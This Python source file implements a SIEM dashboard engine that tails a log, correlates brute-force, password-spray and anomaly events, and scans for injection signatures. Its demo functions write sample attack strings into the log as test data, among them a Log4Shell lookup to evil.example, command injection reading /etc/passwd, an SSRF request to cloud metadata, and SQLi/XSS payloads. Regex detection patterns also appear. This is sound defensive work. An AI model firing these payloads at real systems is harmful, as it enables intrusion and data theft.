"""
Pak-CyberPulse SIEM panel.

- Background daemon thread tails database/live_siem_stream.log (never the
  Streamlit script thread).
- Simulator appends JSONL events to that same append-only file.
- PISF-05 IAM: stateful sliding window — 10 AUTH_FAIL events for one
  (source IP, user) tuple inside 60 seconds.
- PISF-04 / PISF-10: line-level SQLi / XSS signature scan.
- PISF-08: physical-access failed-badge correlation.
- PISF-13: CII-class hosts are severity-elevated.

Detection state is held in process memory (deques + lock). SQLite is updated
only when a control actually changes state, so the GRC matrix stays honest.
"""

from __future__ import annotations

import json
import os
import random
import re
import threading
import time
from collections import defaultdict, deque
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

import streamlit as st

from database.db_manager import (
    CLASS_CII,
    LOG_PATH,
    STATUS_UNDER_ATTACK,
    get_db,
    utc_now,
)
from modules.attack_patterns import PATTERN_BY_ID, SIGNATURE_PATTERNS
from modules.mitre_map import annotate_alert

WINDOW_SECONDS = 60
FAIL_THRESHOLD = 10

# PISF-05.3 behavioral anomaly (UEBA-lite) tuning.
ANOMALY_MIN_BASELINE = 10   # logins needed before a user's profile is trusted
ANOMALY_NEW_IP_MIN = 5      # prior logins needed before a new IP is suspicious
ANOMALY_OFFHOUR_RATIO = 0.10  # hour holding <10% of user's logins => off-hours

SQLI_PATTERNS = (
    r"(?i)('\s*or\s+'?1'?\s*=\s*'?1)|union\s+select|drop\s+table|insert\s+into|sleep\s*\(|xp_cmdshell|information_schema|select\s+.+\s+from",
)
XSS_PATTERNS = (
    r"(?i)<script|javascript:|onerror\s*=|onload\s*=|<img\s+src=|document\.cookie|alert\s*\(",
)
# Broken Access Control / unauthorized horizontal-vertical probes (OWASP A01).
BAC_PATTERNS = (
    r"(?i)(/admin|/config|/wp-admin|/phpmyadmin|/backup|/console|/actuator|/env|/debug|/swagger|/api/v1/admin|/internal)",
)

USERS = ("nadra.ops", "sbp.rtgs", "ntdc.scada", "pkcert.analyst", "portal.admin", "svc.backup")
HOSTS = {
    "NADRA-IDC-ISB": CLASS_CII,
    "SBP-RTGS-KHI": CLASS_CII,
    "NTDC-SCADA-LHR": CLASS_CII,
    "PKCERT-SOC-ISB": CLASS_CII,
    "MOITT-PORTAL": "Standard",
}
SRC_POOL = (
    "203.99.48.17",
    "39.40.12.88",
    "182.176.44.9",
    "111.119.20.4",
    "10.10.8.44",
    "185.220.101.23",
)
ATTACKER_IP = "203.99.48.17"
ATTACKER_USER = "nadra.ops"


def _iso(ts: Optional[float] = None) -> str:
    return datetime.fromtimestamp(ts or time.time(), tz=timezone.utc).strftime(
        "%Y-%m-%dT%H:%M:%S.%fZ"
    )


class SIEMEngine:
    """Thread-safe ingestion + correlation engine. One instance per process."""

    def __init__(self) -> None:
        self.lock = threading.RLock()
        self.write_lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None
        self.log_path = Path(LOG_PATH)
        # Sliding window: (ip, user) -> deque[event_unix_ts]
        self.fail_windows: dict[tuple[str, str], deque[float]] = defaultdict(deque)
        self.recent_events: deque[dict[str, Any]] = deque(maxlen=400)
        self.injection_hits: deque[dict[str, Any]] = deque(maxlen=80)
        self.physical_hits: deque[dict[str, Any]] = deque(maxlen=40)
        self.active_attacks: dict[str, dict[str, Any]] = {}
        self.lines_ingested = 0
        self.last_error = ""
        self.burst_armed = False
        # PISF-05.3 behavioral baselines (UEBA-lite): per-user learned profile.
        self.user_ips: dict[str, set[str]] = defaultdict(set)          # user -> seen source IPs
        self.user_hours: dict[str, dict[int, int]] = defaultdict(lambda: defaultdict(int))  # user -> hour -> AUTH_OK count
        self.user_login_count: dict[str, int] = defaultdict(int)      # user -> total AUTH_OK seen
        self.anomaly_hits: deque[dict[str, Any]] = deque(maxlen=80)
        self.anomaly_fired: set[str] = set()  # dedupe keys "user|kind|detail"
        # Unified threat-pattern hits (signature + behavioral, from attack_patterns registry).
        self.pattern_hits: deque[dict[str, Any]] = deque(maxlen=120)
        self.pattern_fired: set[str] = set()
        # Behavioral correlation state.
        self.spray_windows: dict[str, deque] = defaultdict(deque)      # ip -> deque[(ts, user)]
        self.distrib_windows: dict[str, deque] = defaultdict(deque)    # user -> deque[(ts, ip)]
        self.travel_logins: dict[str, deque] = defaultdict(deque)       # user -> deque[(ts, ip)]
        self.exfil_windows: dict[str, deque] = defaultdict(deque)      # ip -> deque[ts] of export hits
        # v4: numpy-based ML anomaly detector (lazy — created on first use so
        # the import graph stays light and tests can opt out).
        self.ml_anomaly = None
        # DEMO mode is strictly opt-in (UI toggle, default OFF). When False
        # the engine ingests ONLY live sources — no synthesized telemetry,
        # no seeded demo events. Never silently falls back to fake data.
        self.demo_mode = False
        # TELEMETRY_GAP (A09): REAL event timestamps (unix epoch float) of every
        # processed event, replay included. Used to bucket ingest per wall-clock
        # minute from actual event ts values — never from loop iterations.
        self.event_timestamps: deque[float] = deque(maxlen=20000)
        self.telemetry_gap_fired: int = -1

    def start(self) -> None:
        self.log_path.parent.mkdir(parents=True, exist_ok=True)
        self._seed_if_empty()
        if self.thread and self.thread.is_alive():
            return
        self.stop_event.clear()
        self.thread = threading.Thread(
            target=self._monitor_loop,
            name="pak-cyberpulse-siem-tailer",
            daemon=True,
        )
        self.thread.start()

    def set_demo_mode(self, on: bool) -> None:
        """Opt-in switch for synthetic demo telemetry. Default is OFF (live only)."""
        with self.lock:
            self.demo_mode = bool(on)

    def snapshot(self) -> dict[str, Any]:
        with self.lock:
            attacks = list(self.active_attacks.values())
            return {
                "demo_mode": self.demo_mode,
                "lines_ingested": self.lines_ingested,
                "recent": list(self.recent_events)[-80:],
                "injections": list(self.injection_hits)[-40:],
                "physical": list(self.physical_hits)[-20:],
                "attacks": attacks,
                "anomalies": list(self.anomaly_hits)[-40:],
                "patterns": list(self.pattern_hits)[-60:],
                "ml_anomalies": (
                    self.ml_anomaly.recent_anomalies(40) if self.ml_anomaly else []
                ),
                "window_keys": {
                    f"{ip}/{user}": len(q) for (ip, user), q in self.fail_windows.items() if q
                },
                "thread_alive": bool(self.thread and self.thread.is_alive()),
                "last_error": self.last_error,
            }

    def append_event(self, event: dict[str, Any]) -> None:
        """Append one JSONL record. Used by the simulator and by UI burst buttons."""
        line = json.dumps(event, ensure_ascii=False, separators=(",", ":"))
        with self.write_lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
                fh.flush()
                try:
                    os.fsync(fh.fileno())
                except OSError:
                    pass

    def append_events_batch(self, events: list[dict[str, Any]]) -> int:
        """
        v4 performance path: append many events with ONE file open and ONE
        fsync, instead of append_event()'s per-line open+fsync. Used for
        large demo bursts so the UI thread is never blocked on disk I/O.
        Returns the number of lines written.
        """
        if not events:
            return 0
        lines = [
            json.dumps(ev, ensure_ascii=False, separators=(",", ":")) + "\n"
            for ev in events
        ]
        with self.write_lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.writelines(lines)
                fh.flush()
                try:
                    os.fsync(fh.fileno())
                except OSError:
                    pass
        return len(lines)

    def fire_bruteforce_burst(self, count: int = FAIL_THRESHOLD) -> dict[str, Any]:
        """
        Academic demonstration vector: emit `count` AUTH_FAIL events for a
        single (IP, user) inside well under 60 seconds so the sliding-window
        rule is forced to fire. Labelled as a test vector in the payload.
        """
        now = time.time()
        host = "NADRA-IDC-ISB"
        for i in range(count):
            ts = now - (count - 1 - i) * 0.4
            self.append_event(
                {
                    "ts": ts,
                    "iso": _iso(ts),
                    "event": "AUTH_FAIL",
                    "user": ATTACKER_USER,
                    "src_ip": ATTACKER_IP,
                    "host": host,
                    "asset_class": CLASS_CII,
                    "msg": f"sshd: Failed password for {ATTACKER_USER} from {ATTACKER_IP} port {51000 + i}",
                    "vector": "DEMO_BRUTEFORCE_BURST",
                }
            )
        return {
            "src_ip": ATTACKER_IP,
            "user": ATTACKER_USER,
            "host": host,
            "count": count,
            "window_s": WINDOW_SECONDS,
        }

    def fire_anomaly_vector(self) -> dict[str, Any]:
        """
        Academic demonstration vector for PISF-05.3 (UEBA-lite):
        1. Train a baseline: 12 AUTH_OK logins for `svc.backup` at 09:00 UTC
           from the office IP 10.10.8.44 (backdated timestamps — the engine
           learns hour-of-day from the event ts, not wall clock).
        2. Fire the anomaly: one AUTH_OK for the same user at 03:00 UTC from
           a never-before-seen IP 185.220.101.99.
        Expected: NEW_IP + OFF_HOURS findings in the anomaly buffer.
        Labelled as a test vector in the payload.
        """
        user = "svc.backup"
        office_ip = "10.10.8.44"
        # Fresh trigger IP on every call so repeated demos keep firing NEW_IP
        # even though replay-trained baselines remember previous trigger IPs.
        evil_ip = f"185.220.101.{random.randint(91, 99)}"
        host = "MOITT-PORTAL"
        base = time.time()
        # Baseline: 12 morning logins from the office IP.
        for i in range(12):
            ts = base - (12 - i) * 5
            dt = datetime.fromtimestamp(ts, tz=timezone.utc).replace(hour=9, minute=10 + i)
            bts = dt.timestamp()
            self.append_event(
                {
                    "ts": bts,
                    "iso": _iso(bts),
                    "event": "AUTH_OK",
                    "user": user,
                    "src_ip": office_ip,
                    "host": host,
                    "asset_class": "Standard",
                    "msg": f"sshd: Accepted publickey for {user} from {office_ip}",
                    "vector": "DEMO_ANOMALY_BASELINE",
                }
            )
        # Anomaly: 03:00 login from a brand-new IP.
        now = time.time()
        adt = datetime.fromtimestamp(now, tz=timezone.utc).replace(hour=3, minute=7, second=0, microsecond=0)
        ats = adt.timestamp()
        self.append_event(
            {
                "ts": ats,
                "iso": _iso(ats),
                "event": "AUTH_OK",
                "user": user,
                "src_ip": evil_ip,
                "host": host,
                "asset_class": "Standard",
                "msg": f"sshd: Accepted publickey for {user} from {evil_ip}",
                "vector": "DEMO_ANOMALY_TRIGGER",
            }
        )
        return {"user": user, "baseline_ip": office_ip, "anomaly_ip": evil_ip}

    def fire_injection_sample(self) -> dict[str, Any]:
        ts = time.time()
        payload = "' OR 1=1-- <script>alert(1)</script>"
        event = {
            "ts": ts,
            "iso": _iso(ts),
            "event": "HTTP_REQ",
            "user": "portal.admin",
            "src_ip": "185.220.101.23",
            "host": "MOITT-PORTAL",
            "asset_class": "Standard",
            "msg": f"GET /search?q={payload} HTTP/1.1",
            "vector": "DEMO_INJECTION",
        }
        self.append_event(event)
        return event

    def fire_signature_vectors(self) -> dict[str, Any]:
        """One-shot demo: CMDI, SSRF, Log4Shell, SSTI, LFI, misconfig probe."""
        ts = time.time()
        ip = "185.220.101.66"
        payloads = [
            ("CMDI", "GET /ping?host=8.8.8.8; cat /etc/passwd HTTP/1.1"),
            ("SSRF", "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1"),
            ("LOG4SHELL", "GET /app?x=${jndi:ldap://evil.example/x} HTTP/1.1"),
            ("SSTI", "POST /hello name={{7*7}} HTTP/1.1"),
            ("LFI_TRAVERSAL", "GET /static/../../../../etc/passwd HTTP/1.1"),
            ("MISCONFIG_PROBE", "GET /.env HTTP/1.1"),
            ("DESERIAL", "POST /api/obj data=rO0ABXNyAA... HTTP/1.1"),
            ("SECRET_IN_URL", "GET /login?user=bob&password=hunter2 HTTP/1.1"),
            ("BAC_PROBE", "GET /api/user/124/profile HTTP/1.1"),
        ]
        for pid, msg in payloads:
            self.append_event({
                "ts": ts, "iso": _iso(ts), "event": "HTTP_REQ",
                "user": "portal.admin", "src_ip": ip, "host": "MOITT-PORTAL",
                "asset_class": "Standard", "msg": msg,
                "vector": f"DEMO_{pid}",
            })
            ts += 0.2
        return {"count": len(payloads), "src_ip": ip}

    def fire_spray_vector(self) -> dict[str, Any]:
        """PASSWORD_SPRAY demo: 1 IP, 8 users, 2 fails each, inside 120s."""
        ip = "45.155.204.10"
        users = ["nadra.ops", "sbp.rtgs", "ntdc.scada", "pkcert.analyst",
                 "portal.admin", "svc.backup", "hr.clerk", "it.helpdesk"]
        ts = time.time()
        n = 0
        for u in users:
            for _ in range(2):
                ets = ts - (16 - n) * 4
                self.append_event({
                    "ts": ets, "iso": _iso(ets), "event": "AUTH_FAIL",
                    "user": u, "src_ip": ip, "host": "NADRA-IDC-ISB",
                    "asset_class": "CII",
                    "msg": f"sshd: Failed password for {u} from {ip}",
                    "vector": "DEMO_SPRAY",
                })
                n += 1
        return {"src_ip": ip, "users": len(users), "fails": n}

    def fire_travel_vector(self) -> dict[str, Any]:
        """IMPOSSIBLE_TRAVEL demo (heuristic — /16 network change within 15 min, no GeoIP): same user, PK net then US net, 5 min apart."""
        user = "sbp.rtgs"
        t2 = time.time()
        t1 = t2 - 300
        for ts, ip in [(t1, "103.255.4.18"), (t2, "172.58.91.200")]:
            self.append_event({
                "ts": ts, "iso": _iso(ts), "event": "AUTH_OK",
                "user": user, "src_ip": ip, "host": "SBP-RTGS",
                "asset_class": "CII",
                "msg": f"sshd: Accepted publickey for {user} from {ip}",
                "vector": "DEMO_TRAVEL",
            })
        return {"user": user}

    def fire_exfil_vector(self) -> dict[str, Any]:
        """EXFILTRATION demo: 25 rapid /export hits from one IP."""
        ip = "185.220.101.77"
        ts = time.time()
        for i in range(25):
            ets = ts - (25 - i) * 3
            self.append_event({
                "ts": ets, "iso": _iso(ets), "event": "HTTP_REQ",
                "user": "portal.admin", "src_ip": ip, "host": "MOITT-PORTAL",
                "asset_class": "Standard",
                "msg": f"GET /export/customers.csv?part={i} 200 4821133 HTTP/1.1",
                "vector": "DEMO_EXFIL",
            })
        return {"src_ip": ip, "hits": 25}

    # ------------------------------------------------------------------ loop
    def _monitor_loop(self) -> None:
        self.log_path.parent.mkdir(parents=True, exist_ok=True)
        if not self.log_path.exists():
            self.log_path.touch()
        last_gen = 0.0
        try:
            with open(self.log_path, "r", encoding="utf-8", errors="replace") as rf:
                # Replay a short tail so a late-joining UI is not empty, then follow.
                rf.seek(0, os.SEEK_END)
                size = rf.tell()
                rf.seek(max(0, size - 24000))
                if rf.tell() != 0:
                    rf.readline()  # drop partial
                for line in rf.readlines()[-80:]:
                    self._process_line(line, replay=True)
                while not self.stop_event.is_set():
                    line = rf.readline()
                    if line:
                        self._process_line(line, replay=False)
                        continue
                    now = time.time()
                    if now - last_gen >= 1.35:
                        # Synthetic telemetry ONLY in explicit DEMO mode.
                        # Default is live sources only — never fake data.
                        if self.demo_mode:
                            self.append_event(self._synthesize())
                        last_gen = now
                    self._check_telemetry_gap(now)
                    time.sleep(0.12)
        except Exception as exc:  # noqa: BLE001 — surface to UI, keep process alive
            self.last_error = f"{type(exc).__name__}: {exc}"

    def _process_line(self, line: str, replay: bool = False) -> None:
        raw = line.strip()
        if not raw or raw.startswith("#"):
            return
        try:
            event = json.loads(raw)
        except json.JSONDecodeError:
            event = {
                "ts": time.time(),
                "iso": _iso(),
                "event": "RAW",
                "msg": raw[:400],
                "src_ip": "0.0.0.0",
                "user": "-",
                "host": "-",
                "asset_class": "Standard",
            }
        event.setdefault("ts", time.time())
        event.setdefault("iso", _iso(float(event["ts"])))
        with self.lock:
            self.lines_ingested += 1
            self.recent_events.append(event)
            # Record the REAL event timestamp (replay events carry their true
            # logged ts, so the telemetry-gap detector works on actual ingest).
            try:
                self.event_timestamps.append(float(event["ts"]))
            except (TypeError, ValueError):
                self.event_timestamps.append(time.time())
        etype = str(event.get("event", "")).upper()
        if etype == "AUTH_FAIL":
            self._correlate_bruteforce(event, replay=replay)
            self._correlate_spray(event, replay=replay)
            self._correlate_distributed(event, replay=replay)
        if etype == "AUTH_OK":
            self._correlate_anomaly(event, replay=replay)
            self._correlate_travel(event, replay=replay)
        if etype in {"HTTP_REQ", "APP_INPUT", "RAW"}:
            self._scan_injection(event, replay=replay)
            self._scan_patterns(event, replay=replay)
            self._correlate_exfil(event, replay=replay)
        if etype in {"PHYSICAL_FAIL", "BADGE_FAIL"}:
            self._note_physical(event)
        # v4 ML anomaly layer runs on EVERY event type (it learns rate +
        # per-user baselines from the whole stream).
        self._correlate_ml_anomaly(event, replay=replay)

    def _correlate_bruteforce(self, event: dict[str, Any], replay: bool) -> None:
        """
        Stateful sliding window.

        Push (timestamp) onto a per-(ip, user) deque; evict anything older
        than 60s relative to *now* (not relative to file position). Alert
        only when the live occupancy of that deque is >= 10. Replay during
        boot is counted into the window but does not re-open SQLite attacks
        unless the window is still hot.
        """
        ip = str(event.get("src_ip", "0.0.0.0"))
        user = str(event.get("user", "unknown"))
        ts = float(event.get("ts") or time.time())
        key = (ip, user)
        now = time.time()
        cutoff = now - WINDOW_SECONDS
        with self.lock:
            q = self.fail_windows[key]
            q.append(ts)
            while q and q[0] < cutoff:
                q.popleft()
            occupancy = len(q)
            if occupancy < FAIL_THRESHOLD:
                return
            attack_id = f"{ip}/{user}"
            already = attack_id in self.active_attacks
            tenth_ts = q[FAIL_THRESHOLD - 1] if len(q) >= FAIL_THRESHOLD else q[0]
            record = {
                "attack_id": attack_id,
                "src_ip": ip,
                "user": user,
                "host": event.get("host", "-"),
                "asset_class": event.get("asset_class", "Standard"),
                "count": occupancy,
                "window_s": WINDOW_SECONDS,
                "first_ts": q[0],
                "last_ts": q[-1],
                "rule": "PISF-05.2 IAM brute-force sliding window (10 fails / 60s)",
                "triggered_at": utc_now(),
                # True engine-side detection latency: wall-clock now minus the
                # timestamp of the 10th (threshold-tripping) failure.
                "engine_latency_s": round(max(0.0, now - tenth_ts), 3),
            }
            self.active_attacks[attack_id] = record
        if already or replay and occupancy < FAIL_THRESHOLD:
            return
        # Promote IAM (and CII protection when the target is CII) to Under Attack.
        db = get_db()
        evidence = (
            f"SLIDING-WINDOW HIT {occupancy} AUTH_FAIL for {user}@{ip} "
            f"on {event.get('host')} inside {WINDOW_SECONDS}s."
        )
        db.update_control_status("PISF-05.2", STATUS_UNDER_ATTACK, evidence)
        db.update_control_status("PISF-05.1", STATUS_UNDER_ATTACK, evidence)
        if event.get("asset_class") == CLASS_CII:
            db.update_control_status("PISF-13.2", STATUS_UNDER_ATTACK, evidence + " CII escalation.")
        # Automated air-gapped backup + ACL ban for the offending source IP.
        try:
            from modules.soar_engine import contain_source_ip, maybe_trigger_airgap_on_attack

            contain_source_ip(ip)
            maybe_trigger_airgap_on_attack()
        except Exception:
            pass

    def _correlate_anomaly(self, event: dict[str, Any], replay: bool) -> None:
        """
        PISF-05.3 behavioral anomaly (UEBA-lite).

        Learns a per-user baseline from AUTH_OK events:
          - which source IPs the user has ever logged in from
          - at which hours of day (UTC) the user normally logs in
        Flags two anomaly kinds once the baseline is trusted:
          - NEW_IP: first-ever source IP for this user
          - OFF_HOURS: login at an hour holding <10% of the user's logins
        Deduplicated per (user, kind, detail) so the buffer stays readable.
        Replay only trains the baseline; it never fires findings.
        """
        user = str(event.get("user", "unknown"))
        ip = str(event.get("src_ip", "0.0.0.0"))
        ts = float(event.get("ts") or time.time())
        hour = datetime.fromtimestamp(ts, tz=timezone.utc).hour
        with self.lock:
            known_ip = ip in self.user_ips[user]
            self.user_ips[user].add(ip)
            self.user_hours[user][hour] += 1
            self.user_login_count[user] += 1
            total = self.user_login_count[user]
        if replay:
            return
        findings: list[tuple[str, str]] = []
        if not known_ip and total >= ANOMALY_NEW_IP_MIN:
            findings.append(
                ("NEW_IP", f"first-ever login for {user} from {ip} (baseline: {total} prior logins)")
            )
        if total >= ANOMALY_MIN_BASELINE:
            with self.lock:
                hour_share = self.user_hours[user][hour] / max(1, total)
            if hour_share < ANOMALY_OFFHOUR_RATIO:
                findings.append(
                    ("OFF_HOURS", f"{user} logged in at {hour:02d}:00 UTC — only {hour_share:.0%} of their logins happen at this hour")
                )
        for kind, detail in findings:
            dedupe = f"{user}|{kind}|{detail}"
            with self.lock:
                if dedupe in self.anomaly_fired:
                    continue
                self.anomaly_fired.add(dedupe)
                self.anomaly_hits.append(
                    {
                        "ts": ts,
                        "iso": _iso(ts),
                        "user": user,
                        "src_ip": ip,
                        "host": event.get("host", "-"),
                        "kind": kind,
                        "detail": detail,
                        "rule": "PISF-05.3 behavioral anomaly (UEBA-lite)",
                    }
                )
            db = get_db()
            db.update_control_status("PISF-05.3", STATUS_UNDER_ATTACK, f"{kind}: {detail}")

    def _correlate_ml_anomaly(self, event: dict[str, Any], replay: bool) -> None:
        """
        v4: numpy-based ML anomaly layer (z-score / EWMA / entropy / UEBA).

        Every event flows through AnomalyDetector.process_event(). Anomalies
        scoring High/Critical are wired into the existing alert/incident
        pipeline exactly like rule-based detections: an incident-ledger row
        plus an AlertDispatcher dispatch (dry-run by default, same as the
        Alerting tab). Replay only trains baselines; it never fires.
        """
        if self.ml_anomaly is None:
            from modules.anomaly_engine import AnomalyDetector

            self.ml_anomaly = AnomalyDetector()
        anomalies = self.ml_anomaly.process_event(event)
        if replay or not anomalies:
            return
        for anomaly in anomalies:
            if anomaly["severity"] not in {"High", "Critical"}:
                continue
            try:
                db = get_db()
                raw = json.dumps(anomaly, ensure_ascii=False)[:2000]
                db.record_incident(
                    source_ip=anomaly.get("src_ip", "0.0.0.0"),
                    target_host=anomaly.get("host", "-"),
                    classification=f"ML_ANOMALY:{anomaly['detector']}",
                    detection_rule=(
                        f"v4 ML anomaly ({anomaly['detector']}) "
                        f"score={anomaly['score']} — {anomaly['explanation'][:120]}"
                    ),
                    mitigating_action="alert",
                    privilege_state="n/a",
                    raw_record=raw,
                    sha256="",
                )
            except Exception:
                pass
            try:
                from modules.alerting import AlertDispatcher

                AlertDispatcher(dry_run=True).dispatch(
                    {
                        "severity": anomaly["severity"],
                        "title": f"ML anomaly: {anomaly['detector']} "
                                 f"(score {anomaly['score']})",
                        "body": anomaly["explanation"],
                        "destinations": {},
                    }
                )
            except Exception:
                pass

    def _scan_injection(self, event: dict[str, Any], replay: bool) -> None:
        """
        OWASP Top 10 signature scan on live log stream:
          - A03 Injection (SQLi structures: SELECT/UNION/' OR '1'='1)
          - A03 Cross-Site Scripting (<script>, javascript:)
          - A01 Broken Access Control (unauthorized probes of /admin, /config, backdoors)
        On a live (non-replay) hit the SOAR engine is invoked to append the
        offending Source IP to mock_acl_rules.txt and the affected control is
        flagged Non-Compliant / Under Attack in the database state.
        """
        msg = str(event.get("msg", ""))
        hits: list[str] = []
        if re.search(SQLI_PATTERNS[0], msg):
            hits.append("SQLi")
        if re.search(XSS_PATTERNS[0], msg):
            hits.append("XSS")
        if re.search(BAC_PATTERNS[0], msg):
            hits.append("BAC")
        if not hits:
            return
        finding = {
            **event,
            "signatures": hits,
            "rule": "OWASP-Top10 / PISF-04.2 / PISF-10.1 application-layer + access-control",
        }
        with self.lock:
            self.injection_hits.append(finding)
        if replay:
            return
        db = get_db()
        src = str(event.get("src_ip", "0.0.0.0"))
        evidence = (
            f"OWASP signature {hits} from {src} :: {msg[:180]}"
        )
        # Flag system controls Non-Compliant / Under Attack.
        db.update_control_status("PISF-04.2", STATUS_UNDER_ATTACK, evidence)
        db.update_control_status("PISF-10.1", STATUS_UNDER_ATTACK, evidence)
        if "BAC" in hits:
            # Broken Access Control maps cleanly onto IAM / boundary controls.
            db.update_control_status("PISF-05.1", STATUS_UNDER_ATTACK, evidence + " (BAC)")
        # Immediate automated mitigation: append offending IP to ACL via SOAR.
        try:
            from modules.soar_engine import contain_source_ip, maybe_trigger_airgap_on_attack

            contain_source_ip(src)
            maybe_trigger_airgap_on_attack()
        except Exception:
            # Detection must never crash the tailer thread.
            pass

    def _note_physical(self, event: dict[str, Any]) -> None:
        with self.lock:
            self.physical_hits.append(event)

    # ------------------------------------------------------------------
    # Threat-pattern engine (data-driven from modules/attack_patterns.py)
    # ------------------------------------------------------------------
    def _fire_pattern(
        self,
        pattern_id: str,
        event: dict[str, Any],
        matched: str,
        replay: bool,
    ) -> None:
        """Record a pattern hit, update GRC, and run the SOAR mitigation."""
        pat = PATTERN_BY_ID.get(pattern_id)
        if not pat:
            return
        ip = str(event.get("src_ip", "0.0.0.0"))
        dedupe = f"{pattern_id}|{ip}|{matched[:60]}"
        with self.lock:
            if dedupe in self.pattern_fired:
                return
            self.pattern_fired.add(dedupe)
            self.pattern_hits.append(
                {
                    "ts": float(event.get("ts") or time.time()),
                    "iso": event.get("iso", _iso()),
                    "pattern_id": pattern_id,
                    "name": pat["name"],
                    "owasp": pat["owasp"],
                    "pisf": pat["pisf"],
                    "severity": pat["severity"],
                    "src_ip": ip,
                    "user": event.get("user", "-"),
                    "host": event.get("host", "-"),
                    "matched": matched[:120],
                    "mitigation": pat["mitigation"],
                }
            )
        if replay:
            return
        db = get_db()
        db.update_control_status(
            pat["pisf"], STATUS_UNDER_ATTACK,
            f"{pattern_id} {pat['name']} from {ip}: {matched[:80]}",
        )
        self._mitigate_pattern(ip, pat, event)

    def _mitigate_pattern(self, ip: str, pat: dict[str, Any], event: dict[str, Any]) -> None:
        """Execute the pattern's SOAR playbook step for this host's privilege."""
        action = pat.get("soar_action", "alert")
        try:
            from modules.soar_engine import contain_source_ip, maybe_trigger_airgap_on_attack
            if action == "block_ip" and ip and ip != "0.0.0.0":
                contain_source_ip(ip)
            if action == "kill_session":
                try:
                    from modules import zero_trust
                    zt = zero_trust.get_session_manager() if hasattr(zero_trust, "get_session_manager") else None
                except Exception:
                    zt = None
            if pat.get("severity") == "Critical":
                maybe_trigger_airgap_on_attack()
        except Exception:
            pass

    def _scan_patterns(self, event: dict[str, Any], replay: bool) -> None:
        """Signature scan: every registry pattern against the event message."""
        msg = str(event.get("msg", ""))
        if not msg:
            return
        for pat in SIGNATURE_PATTERNS:
            for sig in pat["signatures"]:
                m = re.search(sig, msg)
                if m:
                    self._fire_pattern(pat["id"], event, m.group(0), replay)
                    break  # one hit per pattern per event

    def _correlate_spray(self, event: dict[str, Any], replay: bool) -> None:
        """PASSWORD_SPRAY: one IP, >=5 distinct users, <=2 fails each, 120s."""
        ip = str(event.get("src_ip", ""))
        user = str(event.get("user", ""))
        ts = float(event.get("ts") or time.time())
        if not ip or ip == "0.0.0.0":
            return
        with self.lock:
            q = self.spray_windows[ip]
            q.append((ts, user))
            while q and ts - q[0][0] > 120:
                q.popleft()
            users = {u for _, u in q}
            per_user = defaultdict(int)
            for _, u in q:
                per_user[u] += 1
            spray = len(users) >= 5 and all(c <= 3 for c in per_user.values()) and len(q) >= 8
        if spray and not replay:
            self._fire_pattern(
                "PASSWORD_SPRAY", event,
                f"{len(users)} users targeted from {ip} in 120s", replay,
            )

    def _correlate_distributed(self, event: dict[str, Any], replay: bool) -> None:
        """DISTRIBUTED_BRUTEFORCE: >=5 IPs attacking one user, >=10 fails, 300s."""
        user = str(event.get("user", ""))
        ip = str(event.get("src_ip", ""))
        ts = float(event.get("ts") or time.time())
        if not user or user == "unknown":
            return
        with self.lock:
            q = self.distrib_windows[user]
            q.append((ts, ip))
            while q and ts - q[0][0] > 300:
                q.popleft()
            ips = {i for _, i in q}
            hit = len(ips) >= 5 and len(q) >= 10
        if hit and not replay:
            self._fire_pattern(
                "DISTRIBUTED_BRUTEFORCE", event,
                f"{len(ips)} IPs vs {user}, {len(q)} fails in 300s", replay,
            )

    def _correlate_travel(self, event: dict[str, Any], replay: bool) -> None:
        """IMPOSSIBLE_TRAVEL: heuristic — /16 network change within 15 min, no GeoIP."""
        user = str(event.get("user", ""))
        ip = str(event.get("src_ip", ""))
        ts = float(event.get("ts") or time.time())
        if not user or user in {"-", "unknown"} or not ip or ip.startswith("10."):
            return
        net16 = ".".join(ip.split(".")[:2])
        with self.lock:
            q = self.travel_logins[user]
            q.append((ts, ip))
            while q and ts - q[0][0] > 900:
                q.popleft()
            nets = {".".join(i.split(".")[:2]) for _, i in q if not i.startswith("10.")}
            hit = len(nets) >= 2
        if hit and not replay:
            self._fire_pattern(
                "IMPOSSIBLE_TRAVEL", event,
                f"{user} seen from {len(nets)} networks in 15 min "
                f"(heuristic — /16 network change within 15 min, no GeoIP)", replay,
            )

    def _correlate_exfil(self, event: dict[str, Any], replay: bool) -> None:
        """EXFILTRATION: >=20 export/download hits from one IP in 120s."""
        msg = str(event.get("msg", ""))
        if not re.search(r"(?i)(/export|/download|/backup\.zip|\.csv\?|\.sql\b)", msg):
            return
        ip = str(event.get("src_ip", ""))
        ts = float(event.get("ts") or time.time())
        with self.lock:
            q = self.exfil_windows[ip]
            q.append(ts)
            while q and ts - q[0] > 120:
                q.popleft()
            hit = len(q) >= 20
        if hit and not replay:
            self._fire_pattern(
                "EXFILTRATION", event, f"{len(q)} export/download hits from {ip} in 120s", replay,
            )

    def _check_telemetry_gap(self, now: float) -> None:
        """
        TELEMETRY_GAP (A09): fire when ingest collapses >90% vs 5-min baseline.

        Honest v3 implementation: counts are computed from REAL event
        timestamps recorded in _process_line() (replay events carry their
        true logged ts), NOT from monitor-loop iterations. The current-minute
        count covers [now-60, now); the baseline is the mean per-minute count
        of the 5 completed minute epochs immediately before the current one,
        with each event ts bucketed into its own minute epoch. Requires a full
        5 minutes of timestamp history before it can fire.
        """
        cur_min = int(now // 60)
        current_count = 0
        mean = 0.0
        gap = False
        with self.lock:
            if not self.event_timestamps:
                return
            # Cold-start guard: need a full 5 minutes of real event history.
            if self.event_timestamps[0] > (cur_min - 5) * 60:
                return
            # Single pass: current-minute count + per-minute-epoch baseline buckets.
            baseline_buckets = [0, 0, 0, 0, 0]
            for ts in self.event_timestamps:
                if now - 60 <= ts < now:
                    current_count += 1
                m = int(ts // 60)
                if cur_min - 5 <= m < cur_min:
                    baseline_buckets[m - (cur_min - 5)] += 1
            mean = sum(baseline_buckets) / 5.0
            gap = (
                mean >= 10
                and current_count < 0.10 * mean
                and self.telemetry_gap_fired != cur_min
            )
            if gap:
                self.telemetry_gap_fired = cur_min
        if gap:
            self._fire_pattern(
                "TELEMETRY_GAP",
                {"ts": now, "iso": _iso(now), "src_ip": "-", "user": "-", "host": "SIEM-PIPELINE"},
                f"ingest {current_count}/min vs baseline {mean:.0f}/min (real event timestamps)",
                replay=False,
            )

    def _synthesize(self) -> dict[str, Any]:
